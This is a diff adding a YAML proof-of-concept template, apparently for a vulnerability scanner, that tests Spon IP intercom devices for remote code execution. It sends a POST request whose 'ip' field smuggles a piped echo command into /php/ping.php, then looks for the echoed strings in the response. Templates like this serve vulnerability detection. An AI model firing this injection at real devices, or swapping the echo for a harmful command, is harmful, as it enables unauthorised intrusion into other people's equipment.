@@ -1,0 +1,27 @@
+id: poc-yaml-spon-ip-intercom-ping-rce
+info:
+  name: Spon Ip Intercom Ping 远程代码执行漏洞
+  severity: medium
+  tags:
+  - rce
+  finger: Spon Ip
+  reference: []
+  description: null
+variables:
+  r1: random_str(10)
+  r2: random_str(10)
+  r3: random_str(10)
+  r4: random_str(10)
+transport: http
+requests:
+- method: POST
+  path: /php/ping.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: jsondata[ip]=%7C echo {{.r1}}${{"{"}}{{.r2}}}{{.r3}}^{{.r4}}&jsondata[type]=0
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && (contains(body, r1 + r3 + "^" + r4) || contains(body,
+    r1 + "${" + r2 + "}" + r3 + r4))
+  output: []
